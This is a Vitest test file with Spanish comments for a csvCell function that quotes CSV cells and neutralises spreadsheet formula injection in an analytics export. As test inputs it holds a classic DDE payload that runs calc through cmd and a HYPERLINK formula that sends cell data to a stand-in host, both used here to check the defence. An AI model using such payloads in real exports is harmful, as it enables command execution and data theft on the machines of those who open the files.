import { describe, it, expect } from 'vitest'
import { csvCell } from './csv'

/**
 * Escapar según RFC4180 alcanza para que el CSV se PARSEE bien, no para que sea seguro
 * ABRIRLO: las planillas interpretan como fórmula cualquier celda que empiece con = + - @
 * (o tab / CR). El CSV de analytics serializa datos que NO controla el organizador —el
 * payload de los eventos entra por una ingesta pública— y el que abre el archivo en su
 * máquina es justamente el organizador.
 */
describe('csvCell — seguro para abrir en una planilla, no solo para parsear', () => {
  it('neutraliza los cuatro prefijos de fórmula', () => {
    expect(csvCell('=1+1')).toBe(`"'=1+1"`)
    expect(csvCell('+A1')).toBe(`"'+A1"`)
    expect(csvCell('-2+3')).toBe(`"'-2+3"`)
    expect(csvCell('@SUM(A1)')).toBe(`"'@SUM(A1)"`)
  })

  it('neutraliza el ataque DDE clásico', () => {
    expect(csvCell(`=cmd|'/c calc'!A1`)).toBe(`"'=cmd|'/c calc'!A1"`)
  })

  it('neutraliza la exfiltración por HYPERLINK', () => {
    const ataque = '=HYPERLINK("http://malo.tld?d="&A1,"click")'
    const salida = csvCell(ataque)
    expect(salida.startsWith(`"'=`)).toBe(true)
  })

  it('neutraliza los prefijos con tab y CR', () => {
    expect(csvCell('\t=1+1')).toBe(`"'\t=1+1"`)
    expect(csvCell('\r=1+1')).toBe(`"'\r=1+1"`)
  })

  it('sigue escapando comillas según RFC4180', () => {
    expect(csvCell('dijo "hola"')).toBe('"dijo ""hola"""')
  })

  it('entrecomilla siempre — separadores y saltos quedan contenidos', () => {
    expect(csvCell('a,b')).toBe('"a,b"')
    expect(csvCell('a;b')).toBe('"a;b"')
    expect(csvCell('a\nb')).toBe('"a\nb"')
    expect(csvCell('simple')).toBe('"simple"')
  })

  it('no rompe con números, null ni undefined', () => {
    expect(csvCell(42)).toBe('"42"')
    expect(csvCell(0)).toBe('"0"')
    expect(csvCell(null)).toBe('""')
    expect(csvCell(undefined)).toBe('""')
  })

  it('un texto que solo CONTIENE un = (sin empezar con él) no se toca', () => {
    expect(csvCell('total=10')).toBe('"total=10"')
  })
})
